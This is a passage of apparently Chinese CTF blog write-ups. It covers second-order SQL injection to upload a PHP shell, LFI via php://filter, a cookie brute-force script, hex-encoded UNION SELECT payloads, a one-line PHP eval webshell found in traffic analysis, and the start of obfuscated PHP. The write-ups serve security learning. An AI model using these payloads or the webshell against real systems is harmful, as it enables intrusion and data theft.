class="variable">$result</span>[<span class="string">&quot;extension&quot;</span>];</span><br><span class="line">        <span class="variable">$newname</span> = ROOT.UPLOAD_DIR . <span class="variable">$req</span>[<span class="string">&quot;newname&quot;</span>].<span class="variable">$result</span>[<span class="string">&quot;extension&quot;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$oldname</span>)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">rename</span>(<span class="variable">$oldname</span>, <span class="variable">$newname</span>);</span><br><span class="line">            <span class="variable">$url</span> = <span class="string">&quot;/&quot;</span> . <span class="variable">$newname</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Your file is rename, url:</span></span><br><span class="line"><span class="string">                &lt;a href=\&quot;<span class="subst">&#123;$url&#125;</span>\&quot; target=&#x27;_blank&#x27;&gt;<span class="subst">&#123;$url&#125;</span>&lt;/a&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">                &lt;a href=\&quot;/\&quot;&gt;go back&lt;/a&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;<span class="keyword">echo</span> <span class="variable">$oldname</span>.<span class="string">&quot; not exists.&quot;</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>很明显的二次注入 有一个上传的点,思路就是上传jpg文件然后二次注入改后缀,rename成php文件 首先传一个注入的文件,比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;,`extension`=&#x27;&#x27;,`filename`=&#x27;blacsheep.jpg.jpg</span><br></pre></td></tr></table></figure><p>里面写好shell <img src="/images/2018/09/2018-09-05-12-36-22屏幕截图.png" alt="blacsheep" /> 然后去rename一下<code>',`extension`='',`filename`='blacsheep.jpg.jpg</code>rename成<code>blacsheep.jpg</code>,然后rename的时候这里会自己加后缀,所以文件被rename成了blacsheep.jpg.jpg,而数据库中因为注入的原因所以是blacsheep.jpg <img src="/images/2018/09/2018-09-05-12-36-47屏幕截图.png" alt="blacsheep" /> <img src="/images/2018/09/2018-09-05-12-36-53屏幕截图.png" alt="blacsheep" /> 然后我们传一个blacsheep.jpg,再去rename.php里把blacsheep.jpg给rename成blacsheep.php <img src="/images/2018/09/2018-09-05-12-37-11屏幕截图.png" alt="blacsheep" /> <img src="/images/2018/09/2018-09-05-12-37-28屏幕截图.png" alt="blacsheep" /> 这里会先去查找blacsheep.jpg,然后发现了我们的注入的记录,加上ext之后文件名为blacsheep.jpg,刚刚好我们上传了这个文件,那么对文件的rename的时候也就没有问题了 <img src="/images/2018/09/2018-09-05-12-37-34屏幕截图.png" alt="blacsheep" /> 查看下 <img src="/images/2018/09/2018-09-05-12-37-52屏幕截图.png" alt="blacsheep" /></p><h2 id="蓝鲸笔记管理系统">蓝鲸笔记管理系统</h2><p>这个题出的还蛮好的,记录一下 一出来是个注册登录,然后里面有个留言功能,测试一下sql注入,失败 虽然有思考到文件包含,但是发现web目录并没有login.php 后来看wp才知道前面的action是文件夹,后面的mode是文件名,也就等价于</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include $action.&quot;/&quot;.$mode.&quot;.php&quot;;</span><br></pre></td></tr></table></figure><p>那么构造一下拿到index的源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://106.39.10.134:10002/index.php?action=php://filter/read=convert.base64-encode/resource=.&amp;mode=index</span><br></pre></td></tr></table></figure><p>index.php的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;DIR_PERMITION&quot;</span>,<span class="title function_ invoke__">time</span>());</span><br><span class="line"><span class="comment">// phpinfo();</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">d_addslashes</span>(<span class="params"><span class="variable">$array</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$array</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$value</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">is_array</span>(<span class="variable">$value</span>))&#123;</span><br><span class="line">              !<span class="title function_ invoke__">get_magic_quotes_gpc</span>()&amp;&amp;<span class="variable">$value</span>=<span class="title function_ invoke__">addslashes</span>(<span class="variable">$value</span>);</span><br><span class="line">              <span class="variable">$array</span>[<span class="variable">$key</span>]=<span class="variable">$value</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">          <span class="variable">$array</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">d_addslashes</span>(<span class="variable">$array</span>[<span class="variable">$key</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$array</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_POST</span>=<span class="title function_ invoke__">d_addslashes</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="variable">$_GET</span>=<span class="title function_ invoke__">d_addslashes</span>(<span class="variable">$_GET</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&#x27;common.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>])!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: ./index.php?action=front&amp;mode=login&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">elseif</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\.&#123;2&#125;/is&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>])&amp;&amp;<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[0-9A-Za-z]+$/is&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$action</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line">    <span class="variable">$mode</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span>=<span class="variable">$action</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$mode</span>.<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// echo $file;</span></span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Invalid Request!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>);</span><br></pre></td></tr></table></figure><p>然后读common.php,扫目录发现admin目录,然后读一下admin下面的login和index 发现admin的登录需要猜随机数,不过只有6位,而且还是仅有'wh'构成的,写个脚本爆破一下,简易脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">str1</span>):</span><br><span class="line">    res_md5 = hashlib.md5()</span><br><span class="line">    res_md5.update(<span class="built_in">str</span>(str1).encode())</span><br><span class="line">    <span class="keyword">return</span> res_md5.hexdigest()</span><br><span class="line"></span><br><span class="line">u = requests.session()</span><br><span class="line">charlist = <span class="string">&quot;wh&quot;</span></span><br><span class="line">length = <span class="number">6</span></span><br><span class="line">half_uid = <span class="string">&quot;admin%7C&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> one <span class="keyword">in</span> charlist:</span><br><span class="line">    <span class="keyword">for</span> two <span class="keyword">in</span> charlist:</span><br><span class="line">        <span class="keyword">for</span> thr <span class="keyword">in</span> charlist:</span><br><span class="line">            <span class="keyword">for</span> fou <span class="keyword">in</span> charlist:</span><br><span class="line">                <span class="keyword">for</span> fif <span class="keyword">in</span> charlist:</span><br><span class="line">                    <span class="keyword">for</span> six <span class="keyword">in</span> charlist:</span><br><span class="line">                        uid = half_uid + md5(one+two+thr+fou+fif+six+<span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">                        cookies = &#123;<span class="string">&quot;uid&quot;</span> : uid&#125;</span><br><span class="line">                        r = u.get(<span class="string">&#x27;http://106.39.10.134:10002/index.php?action=admin&amp;mode=index&#x27;</span>, cookies = cookies)</span><br><span class="line">                        r.encoding = r.apparent_encoding</span><br><span class="line">                        <span class="keyword">if</span> <span class="string">&quot;not login&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                            <span class="built_in">print</span>(r.text)</span><br><span class="line">                            <span class="built_in">print</span>(r.request.headers[<span class="string">&quot;Cookie&quot;</span>])</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">&quot;not login:&quot;</span>+one+two+thr+fou+fif+six)</span><br></pre></td></tr></table></figure><p>然后登录到admin页面,发现一个页面修改的地方,读源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">defined</span>(<span class="string">&quot;DIR_PERMITION&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Permision denied!&quot;</span>);</span><br><span class="line"><span class="variable">$userid</span>=<span class="title function_ invoke__">check_login</span>();</span><br><span class="line"><span class="variable">$level</span>=<span class="title function_ invoke__">get_level</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$userid</span>!==<span class="literal">false</span>&amp;&amp;<span class="variable">$level</span>!==<span class="literal">false</span>)&#123;</span><br><span class="line">      <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;page&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;TOKEN&#x27;</span>]))&#123;</span><br><span class="line">          <span class="variable">$page</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">          <span class="variable">$TOKEN</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;TOKEN&#x27;</span>];</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span>(<span class="variable">$TOKEN</span>!=<span class="variable">$_SESSION</span>[<span class="string">&#x27;CSRF_TOKEN&#x27;</span>])&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;token error!&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$page</span>))&#123;</span><br><span class="line">              <span class="keyword">die</span>(<span class="string">&quot;page must be a number!&quot;</span>);   </span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span>(<span class="variable">$page</span>&lt;<span class="number">1</span>) <span class="variable">$page</span>=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">          <span class="variable">$sql</span>=<span class="string">&quot;update page set num=<span class="subst">$page</span>&quot;</span>;</span><br><span class="line">          <span class="variable">$res</span>=<span class="title function_ invoke__">mysql_my_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">          <span class="keyword">if</span>(<span class="variable">$res</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;update  success!&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;location.href=&#x27;./index.php?action=admin&amp;mode=index&#x27;&lt;/script&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">          &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">               <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;update  fail!&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">               <span class="keyword">die</span>();</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;not login!&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;location.href=&#x27;./index.php?action=admin&amp;mode=login&#x27;&lt;/script&gt;&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">    <span class="comment">// $result=mysql_my_query($sql);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现isnumeric过滤了一下,hex绕过 然后在index.php发现</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$page_size</span>=<span class="title function_ invoke__">get_page_size</span>();</span><br><span class="line"><span class="comment">//默认仅仅显示 前$page_size条数据 </span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select * from note  limit 0,&quot;</span>.<span class="variable">$page_size</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_my_query</span>(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure><p>去common.php中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_page_size</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">      <span class="variable">$sql</span>=<span class="string">&quot;select num from page&quot;</span>;</span><br><span class="line">      <span class="variable">$res</span>=<span class="title function_ invoke__">mysql_my_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">      <span class="variable">$row</span>=<span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">      <span class="keyword">return</span> <span class="variable">$row</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_page_size</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$sql</span>=<span class="string">&quot;update page set num=20&quot;</span>;</span><br><span class="line">    <span class="variable">$res</span>=<span class="title function_ invoke__">mysql_my_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就可以看到是个二次注入,但前提必须是数据库page表的num列必须是varchar,题目的hint里面给出了dbinit.sql文件,查看发现定义的page就是varchar,那么后面的就简单了,我们去构造sql的语句,hexencode一下,然后写到数据库,之后访问index的时候num被提取出来,并且被放到limit后面执行. 我们构造一个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union select 1,2,3,4</span><br></pre></td></tr></table></figure><p>所以提交一个 0x3120756e696f6e2073656c65637420312c322c332c34 得到结果 <img src="/images/2018/09/2018-09-05-14-33-50屏幕截图.png" alt="blacsheep" /> 继续在2处注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union select 1,flag,3,4 from flags</span><br></pre></td></tr></table></figure><p>hex一下成了0x3120756e696f6e2073656c65637420312c666c61672c332c342066726f6d20666c616773 提交一下 <img src="/images/2018/09/2018-09-05-14-35-38屏幕截图.png" alt="blacsheep" /></p>]]></content>
      
      
      <categories>
          
          <category> web篇 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>安恒8月月赛流量分析</title>
      <link href="/2018/08/31/%E5%AE%89%E6%81%928%E6%9C%88%E6%9C%88%E8%B5%9B%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
      <url>/2018/08/31/%E5%AE%89%E6%81%928%E6%9C%88%E6%9C%88%E8%B5%9B%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="首先">首先</h2><p>简单记录一下 流量包下载地址：<a href="https://pan.baidu.com/s/13SoD6xB7YBiqpUDCIcb8mg" title="https://pan.baidu.com/s/13SoD6xB7YBiqpUDCIcb8mg">https://pan.baidu.com/s/13SoD6xB7YBiqpUDCIcb8mg</a></p><h2 id="第一题">第一题</h2><p><strong>某公司内网网络被黑客渗透，请分析流量，给出黑客使用的扫描器</strong> 一开始以为是sqlmap,不过后来发现有awvs的痕迹 <img src="/images/2018/08/2018-08-28-19-56-56屏幕截图.png" alt="blacsheep" /> 那么显然扫描器填awvs</p><h2 id="第二题">第二题</h2><p><strong>某公司内网网络被黑客渗透，请分析流量，得到黑客扫描到的登陆后台是(相对路径即可)</strong> 直接过滤post的包 <img src="/images/2018/08/2018-08-28-20-44-06屏幕截图.png" alt="blacsheep" /></p><h2 id="第三题">第三题</h2><p><strong>某公司内网网络被黑客渗透，请分析流量，得到黑客使用了什么账号密码登陆了web后台(形式:username/password)</strong> 查看post到后台的包,然后查看双方的包,成功的包会302,否则显示错误 成功的包 <img src="/images/2018/08/2018-08-28-20-55-22屏幕截图.png" alt="blacsheep" /> <img src="/images/2018/08/2018-08-28-20-53-28屏幕截图.png" alt="blacsheep" /> 然后失败的包 <img src="/images/2018/08/2018-08-28-20-57-57屏幕截图.png" alt="blacsheep" /></p><h2 id="第四题">第四题</h2><p><strong>某公司内网网络被黑客渗透，请分析流量，得到黑客上传的webshell文件名是，内容是什么,提交webshell内容的base编码</strong> 菜刀连的webshell一般都经过了base64,所以直接过滤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;base64_decode&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/2018/08/2018-08-31-14-45-59屏幕截图.png" alt="blacsheep" /> 发现了shell,文件名a.php,密码1234 猜测webshell是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[1234]);?&gt;</span><br></pre></td></tr></table></figure><p>然后成功了</p><h2 id="第五题">第五题</h2><p><strong>某公司内网网络被黑客渗透，请分析流量，黑客在robots.txt中找到的flag是什么</strong> 直接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;robots.txt&quot;</span><br></pre></td></tr></table></figure><figure><img src="/images/2018/08/2018-08-31-14-55-54屏幕截图.png" alt="blacsheep" /><figcaption aria-hidden="true">blacsheep</figcaption></figure><h2 id="第六题">第六题</h2><p><strong>某公司内网网络被黑客渗透，请分析流量，黑客找到的数据库密码是多少</strong> 这个在看a.php的response的时候发现读了config</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;&lt;?php&quot;</span><br></pre></td></tr></table></figure><p>然后找到 <img src="/images/2018/08/2018-08-31-14-59-34屏幕截图.png" alt="blacsheep" /></p><h2 id="第七题">第七题</h2><p><strong>某公司内网网络被黑客渗透，请分析流量，黑客在数据库中找到的hash_code是什么</strong> <img src="/images/2018/08/2018-08-31-15-05-31屏幕截图.png" alt="blacsheep" /></p><h2 id="第八题">第八题</h2><p><strong>某公司内网网络被黑客渗透，请分析流量，黑客破解了账号ijnu@test.com得到的密码是什么</strong> <img src="/images/2018/08/2018-08-31-15-07-50屏幕截图.png" alt="blacsheep" /> 然后解一下 <img src="/images/2018/08/2018-08-31-15-10-22屏幕截图.png" alt="blacsheep" /></p><h2 id="第九题">第九题</h2><p><strong>某公司内网网络被黑客渗透，请分析流量，被黑客攻击的web服务器，网卡配置是是什么，提交网卡内网ip</strong> 还是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;eth0&quot;</span><br></pre></td></tr></table></figure><p>然后找到了a.php的记录 <img src="/images/2018/08/2018-08-31-15-27-11屏幕截图.png" alt="blacsheep" /></p><h2 id="第十题">第十题</h2><p><strong>某公司内网网络被黑客渗透，请分析流量，黑客使用了什么账号登陆了mail系统（形式: username/password）</strong> 同第三题</p><h2 id="第十一题">第十一题</h2><p><strong>某公司内网网络被黑客渗透，请分析流量，黑客获得的vpn,ip是多少</strong> 查看tcp流,提交一下两个流量最多的ip 发现答案是10.3.4.3</p>]]></content>
      
      
      <categories>
          
          <category> misc篇 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>i春秋web刷题(持续更新)</title>
      <link href="/2018/08/15/i%E6%98%A5%E7%A7%8Bweb%E5%88%B7%E9%A2%98%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"/>
      <url>/2018/08/15/i%E6%98%A5%E7%A7%8Bweb%E5%88%B7%E9%A2%98%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="i春秋第二届春秋欢乐赛">i春秋第二届春秋欢乐赛</h2><h3 id="hello-world">Hello World</h3><p>题目内容:<a href="http://106.75.72.168:9999/" title="http://106.75.72.168:9999/">http://106.75.72.168:9999/</a> 进去之后只有一个helloworld的页面,扫一下目录,发现.git githack一下,看一下log,reset一下拿到源码 代码格式非常烂,找个美化工具美化一下,代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;Off&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$b</span>, <span class="variable">$c</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$d</span> = <span class="number">0</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$e</span> = <span class="number">4</span>;</span><br><span class="line">    <span class="variable">$c</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$c</span>);</span><br><span class="line">    <span class="variable">$f</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$c</span>, <span class="number">0</span>, <span class="number">16</span>));</span><br><span class="line">    <span class="variable">$g</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$c</span>, <span class="number">16</span>, <span class="number">16</span>));</span><br><span class="line">    <span class="variable">$h</span> = <span class="variable">$e</span> ? (<span class="variable">$k</span> == <span class="string">&#x27;DECODE&#x27;</span> ? <span class="title function_ invoke__">substr</span>(<span class="variable">$b</span>, <span class="number">0</span>, <span class="variable">$e</span>) : <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">microtime</span>()) , -<span class="variable">$e</span>)) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$l</span> = <span class="variable">$f</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$f</span> . <span class="variable">$h</span>);</span><br><span class="line">    <span class="variable">$m</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$l</span>);</span><br><span class="line">    <span class="variable">$b</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;%010d&#x27;</span>, <span class="variable">$d</span> ? <span class="variable">$d</span> + <span class="title function_ invoke__">time</span>() : <span class="number">0</span>) . <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span> . <span class="variable">$g</span>) , <span class="number">0</span>, <span class="number">16</span>) . <span class="variable">$b</span>;</span><br><span class="line">    <span class="variable">$n</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$b</span>);</span><br><span class="line">    <span class="variable">$o</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$p</span> = <span class="title function_ invoke__">range</span>(<span class="number">0</span>, <span class="number">255</span>);</span><br><span class="line">    <span class="variable">$q</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$r</span> = <span class="number">0</span>; <span class="variable">$r</span> &lt;= <span class="number">255</span>; <span class="variable">$r</span>++) &#123;</span><br><span class="line">        <span class="variable">$q</span>[<span class="variable">$r</span>] = <span class="title function_ invoke__">ord</span>(<span class="variable">$l</span>[<span class="variable">$r</span> % <span class="variable">$m</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$s</span> = <span class="variable">$r</span> = <span class="number">0</span>; <span class="variable">$r</span> &lt; <span class="number">256</span>; <span class="variable">$r</span>++) &#123;</span><br><span class="line">        <span class="variable">$s</span> = (<span class="variable">$s</span> + <span class="variable">$p</span>[<span class="variable">$r</span>] + <span class="variable">$q</span>[<span class="variable">$r</span>]) % <span class="number">256</span>;</span><br><span class="line">        <span class="variable">$t</span> = <span class="variable">$p</span>[<span class="variable">$r</span>];</span><br><span class="line">        <span class="variable">$p</span>[<span class="variable">$r</span>] = <span class="variable">$p</span>[<span class="variable">$s</span>];</span><br><span class="line">        <span 